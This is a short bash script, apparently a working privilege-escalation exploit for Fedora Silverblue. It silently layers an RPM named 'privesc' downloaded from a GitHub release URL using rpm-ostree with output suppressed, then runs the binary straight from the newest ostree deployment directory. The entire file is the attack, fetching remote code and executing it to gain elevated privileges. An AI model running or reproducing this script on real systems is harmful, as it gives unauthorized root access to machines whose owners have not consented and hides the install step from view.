#!/usr/bin/env bash

rpm_url="https://github.com/rohanssrao/silverblue-privesc/releases/latest/download/privesc-0.0.1.x86_64.rpm"
echo "Layering $rpm_url..."
rpm-ostree install --assumeyes "$rpm_url" &> /dev/null
$(ls -td /ostree/deploy/fedora/deploy/*/ | head -1)/usr/bin/privesc
